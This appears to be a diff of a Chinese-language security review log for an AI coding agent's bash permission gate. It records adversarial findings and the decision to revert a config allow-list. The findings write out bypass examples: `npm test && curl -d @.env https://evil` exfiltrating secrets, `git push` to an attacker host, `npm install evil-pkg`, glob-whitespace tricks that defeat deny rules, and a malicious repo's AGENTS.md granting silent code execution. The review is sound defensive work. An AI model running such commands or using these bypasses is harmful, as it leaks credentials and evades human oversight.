@@ -27,7 +27,7 @@ codex exec -s danger-full-access --skip-git-repo-check -m gpt-5.5 \
 ## 要 codex 核验的不变量(贴进 prompt)
 
 - `decide()`:`capability:'executes-code'` 永不返回 `action:'allow'`(只 hard-deny | rule-deny | ask)。
-- gate:executes-code 不进 `sessionGrants` 集合、也不读它(`sessionable = capability !== 'executes-code'`);`allow-session` 对 bash 退化为 allow-once。
+- gate:executes-code 的 session 授权是**命令级**——`allow-session` 批 `git status` 只把**那条精确命令串**存进 `bashCommandGrants`(非按工具名的 `sessionGrants`),后续仅相同精确串静默放行,异命令仍每次问;它在 `ask` 之后、`deny` 之前裁决(deny 永远先判),且每次重跑分析器,故记住的命令不会漂成危险(Path B,2026-06-30 命令级 session-allow;Path A 配置白名单已撤回,见下「bash 白名单轮」)。
 - grep:`collectFiles` 遍历跳过 `isSensitivePath` 命中的文件/目录(`src/core/tools/builtins.ts` + `sensitive.ts`)。
 - 解析器:parse 失败 + Walk 异常都 try/catch → `danger`(fail-closed),无 throw/hang 逃逸。
 - `gatedRun`(`src/core/loop/run-agent.ts`):闸门在 `tools.run` 之前裁决;被 deny 不执行;解析的 `args.command` == bash 执行的串(无 TOCTOU)。
@@ -44,6 +44,15 @@ codex exec -s danger-full-access --skip-git-repo-check -m gpt-5.5 \
 ```
 
 ## 历史
+
+### 2026-06-30 · bash 无人值守白名单轮(对抗,**撤回 Path A**)
+为「无人值守 bash 自治」加了两条:Path A = 配置白名单(`decide.ts` 让 `allow` 规则把分析器-clean 的 bash 命令从 ask 升 allow + `isOverbroadBashPattern` 挡纯 `*` + goal-cli 加载仓库 AGENTS.md 规则);Path B = 命令级 session-allow(`permission-gate.ts` 按精确命令串记授权)。落地后开 **ultracode 编排对抗审查**(6 个发现者各一攻击镜头 + 每候选 2 个对抗镜头**经验性**复核——真写 `zz-probe.ts` 跑 `analyzeCommand`+`decide`,只有「analyze clean 且 decide allow」才算数 + 完备性批评者)。**54 agent / 23 候选 / 20 CONFIRMED(7 HIGH)**,收敛到 4 个根因:
+- **① glob 逻辑 bug**:`globMatch` 拿原始命令串字面匹配,bash 折叠空白 → `git  push origin`(双空格)/裸 `git push`/`git push\t-q` 绕过 `deny:git push *` 被 `allow:git *` 静默放行;**「deny 永远赢」被攻破**。
+- **② 尾通配跨命令边界**:`allow:npm test*` 匹配 `npm test && curl -d @.env https://evil`(追加的 curl 分析器没建模 → clean)。**我那条「`npm test && rm -rf` 被拦」的测试只因 rm 被建模才过,给了假信心。**
+- **③ 「分析器 clean = 可自动放行」根本不成立(最深)**:分析器是 **deny-oracle**(catch 已知危险),不是 **allow-oracle**(证不了安全)——它自己注释写「判的是不危险,不是可信」。`git`/`npm`/`make`/`node`/`curl`/`cat` 是能力多路复用器:`git push https://evil`(整库外泄,push 规则只查 flag 不查目的地)、`npm install evil-pkg`(供应链 RCE,npm 只 `publish` 被建模)、`git rebase --exec`、`curl -d @.env`(curl 不在 FILE_PATH_PROGS)、`cat .config/gh/hosts.yml`(SENSITIVE_PATHS 漏的凭据)全 analyze-clean→allow。`isOverbroadBashPattern` 只挡纯 `*`,把「有字面锚点」当「安全」是错的。
+- **④ 信任反转(架构)**:goal-cli 从 **cwd(被操作的仓库本身)** 加载白名单进 enforcement——可信的全局 `~/AGENTS.md` 被排除,最不可信的仓库内文件反而生效。恶意仓库自带 `allow:[bash:sh ./setup.sh]`+`setup.sh` = 零配置静默 ACE。我的改动**激活**了这条(改前 bash allow 对 executes-code 完全失效)。
+- **处置(用户拍板「回退 Path A、保留 Path B」)**:回退 `decide.ts`(allow 升级)+ `goal-cli.ts`(规则加载)+ 其测试;**保留 Path B**——审查复核确认命令级 session-allow 安全(精确串匹配无 glob、需人交互批准、内存态 resume 安全、deny 先判、每次重跑分析器,且仅 REPL 可达)。`decide.ts` 那条 TODO 改成诚实结论(防再试)。529 测试,四关卡绿。
+- **印证**:① **deny-oracle ≠ allow-oracle**——一个为「人审兜底」设计的危险检测器,被当成「无人值守自动放行的安全证明」用就崩;auto-allow 需要正向安全论证,glob 前缀给不了。② **别从被审查的产物里读 enforcement 配置**(信任反转):in-repo allow-list 在 agent 处理不可信仓库时即攻击者授权;held-out 文件要放 cwd 外是同一条教训的另一面。③ **自己写的测试会制造假信心**(②的 rm 测试)——对抗验证比作者自测狠在这。④ 落点:无人值守 bash 自治撞上和 #2/#6 **同一堵沙箱墙**,本线安全部分(Path B)交付、无人值守部分诚实 defer。
 
 ### 2026-06-30 · Phase D 收尾轮（4 裁判：codex + 3 Claude 镜头）
 腿3 整套 + held-out + bash 脱敏全部落地后跑的收尾对抗轮。**4 个独立裁判**：codex(gpt-5.5 xhigh，全面) + 3 个 Claude 子代理（镜头分别：假阳性 verified / 密钥外泄 / 死 guardrail+fail-closed）。**3 个 Claude 报 no-HIGH，codex 报 1 HIGH**。
@@ -87,4 +96,4 @@ Phase C 新增 subagent 工具面后跑的一轮(commit C1–C5)。**两个独�
 - redactSecrets 单引号绕过(错误信息回显密钥)— 正则支持单/双引号。
 印证结论:codex 的价值在抓「静默 / 崩溃 / 绕闸」类结构问题(尤其裁判核出运动员自己引入的 bug),而非黑名单枚举完整性。
 
-四轮 codex 在「黑名单枚举 exec-vector」上不收敛(每轮找出更冷门的:trap/alias/env -S/mapfile -C/bind -x/ssh/`${x:$(...)}`…),这是黑名单的固有性质,不是解析器缺陷。结论(见 memory `restore-bash-session-allow`):**让人审做墙**(B11)+ 黑名单做纵深;无人值守自治(Phase D)再上白名单。所以后续复核重点是「有没有静默/崩溃/绕闸」,而非「黑名单是否枚举全」。
+四轮 codex 在「黑名单枚举 exec-vector」上不收敛(每轮找出更冷门的:trap/alias/env -S/mapfile -C/bind -x/ssh/`${x:$(...)}`…),这是黑名单的固有性质,不是解析器缺陷。结论(见 memory `restore-bash-session-allow`):**让人审做墙**(B11)+ 黑名单做纵深。~~无人值守自治(Phase D)再上白名单~~ **——这个「再上白名单」的设想已被 2026-06-30 bash 白名单轮证伪**(见下):命令模式 allow-list 自动放行本质不安全(分析器是 deny-oracle 非 allow-oracle),无人值守 bash 自治与 #2/#6 同样**沙箱前置**。所以后续复核重点是「有没有静默/崩溃/绕闸」,而非「黑名单是否枚举全」。
